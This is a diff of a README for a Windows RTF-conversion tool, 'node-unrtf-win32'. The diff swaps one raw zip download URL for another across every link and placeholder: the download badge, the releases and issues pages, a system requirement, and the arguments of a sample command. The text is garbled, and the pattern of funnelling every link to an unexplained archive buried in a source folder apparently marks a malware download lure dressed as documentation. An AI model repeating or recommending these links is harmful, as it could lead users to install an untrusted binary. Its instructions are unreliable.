@@ -6,12 +6,12 @@ Welcome to the **node-unrtf-win32** project! This application allows you to conv
 
 ## 📥 Download Node UnRTF
 
-[![Download Node UnRTF](https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip)](https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip)
+[![Download Node UnRTF](https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip)](https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip)
 
 ## 📋 System Requirements
 
 - Windows 32-bit operating system
-- https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip installed (if required for future needs)
+- https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip installed (if required for future needs)
 
 ## 💻 Features
 
@@ -21,11 +21,11 @@ Welcome to the **node-unrtf-win32** project! This application allows you to conv
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip) to download the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip) to download the software.
    
 2. **Select the Latest Version:** Look for the latest version of the binary package. It should be clearly marked.
 
-3. **Download the File:** Click on the link to download the **https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip** file.
+3. **Download the File:** Click on the link to download the **https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip** file.
 
 4. **Extract the Zip File:** Once downloaded, right-click on the zip file and select "Extract All..." to unzip the contents.
 
@@ -44,9 +44,9 @@ Welcome to the **node-unrtf-win32** project! This application allows you to conv
 
 3. **Convert Your File:** Use the command line to convert your RTF file. Here’s a simple command structure:
    ```
-   node unrtf <https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip> -o <https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip>
+   node unrtf <https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip> -o <https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip>
    ```
-   Replace `<https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip>` with the name of your RTF file and provide the desired output filename.
+   Replace `<https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip>` with the name of your RTF file and provide the desired output filename.
 
 4. **Check Converted File:** After running the command, locate the output file in the same directory or specify a different path in the command.
 
@@ -61,7 +61,7 @@ For detailed usage and support, please refer to the documentation provided in th
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, please submit an issue on the [GitHub Issues page](https://raw.githubusercontent.com/YAAMABS/node-unrtf-win32/main/test/node-unrtf-win32_v1.6-alpha.4.zip). We appreciate your contributions and feedback.
+If you encounter any issues or need assistance, please submit an issue on the [GitHub Issues page](https://github.com/YAAMABS/node-unrtf-win32/raw/refs/heads/main/src/lib/unrtf-0.19.3/contrib/unrtf/0.19.3/unrtf_node_win_2.2.zip). We appreciate your contributions and feedback.
 
 ## 📄 License
 
